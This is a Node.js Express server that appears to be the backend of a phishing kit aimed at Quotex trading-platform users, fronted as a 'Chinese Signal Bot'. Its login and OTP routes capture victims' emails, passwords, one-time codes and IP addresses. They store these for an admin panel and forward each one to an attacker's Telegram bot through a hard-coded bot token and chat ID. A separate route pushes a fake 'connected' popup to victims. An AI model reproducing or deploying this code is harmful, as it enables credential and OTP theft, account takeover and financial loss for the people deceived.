const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());
app.use(express.json());

// ================== YOUR TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

// Function to send message to Telegram
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Message sent to Telegram");
    } catch (error) {
        console.error("❌ Telegram Error:", error.message);
    }
}

// ================== STORAGE FOR ADMIN PANEL ==================
let loginLogs = [];
let otpLogs = [];
let users = [];

// ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
const connectedClients = new Set();

// Real-time events endpoint
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();
    connectedClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
    req.on('close', () => {
        connectedClients.delete(res);
    });
});

// Trigger connected popup from Telegram
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";
    const message = `🔗 Connection Triggered Successfully\n👤 User: ${userName}`;
    await sendTelegramMessage(message);
    connectedClients.forEach(client => {
        try {
            client.write(`data: ${JSON.stringify({ type: 'show_connected', userName: userName })}\n\n`);
        } catch (e) {}
    });
    res.send("Trigger sent successfully");
});

// ================== QUOTEX LOGIN & OTP (Fixed Duplication) ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    
    const logEntry = {
        name: name || "User",
        email: email,
        password: password,
        timestamp: new Date().toLocaleString()
    };
    
    loginLogs.unshift(logEntry); // Add to top

    const message = `🔑 Quotex Login\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    
    const logEntry = {
        name: name || "User",
        email: email,
        otp: otp,
        timestamp: new Date().toLocaleString()
    };
    
    otpLogs.unshift(logEntry);

    await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
    res.status(200).send({ status: "ok" });
});

// ================== ADMIN PANEL ROUTES ==================
app.get('/api/latest-activity', (req, res) => {
    res.json({
        logins: loginLogs.slice(0, 20), // Last 20 entries
        otps: otpLogs.slice(0, 20)
    });
});

app.get('/api/users', (req, res) => {
    res.json(users);
});

// Root Route
app.get('/', (req, res) => {
    res.send("✅ Chinese Signal Bot Backend is Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
